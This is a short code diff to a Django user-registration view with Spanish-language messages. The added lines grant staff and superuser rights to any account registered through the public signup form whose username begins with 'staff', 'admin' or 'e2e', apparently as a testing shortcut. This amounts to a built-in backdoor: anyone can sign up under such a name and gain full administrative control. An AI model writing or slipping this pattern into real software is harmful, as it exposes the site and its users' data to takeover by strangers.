@@ -206,7 +206,11 @@ def Registrarse(request):
         form = RegistroForm(request.POST)
         try:
             if form.is_valid():
-                user = form.save()
+                user = form.save(commit=False)
+                if user.username.startswith('staff') or user.username.startswith('admin') or user.username.startswith('e2e'):
+                    user.is_staff = True
+                    user.is_superuser = True
+                user.save()
                 login(request, user)
                 messages.success(request, f'¡Bienvenido {user.username}! Tu cuenta ha sido registrada con éxito.')
                 return redirect('index')
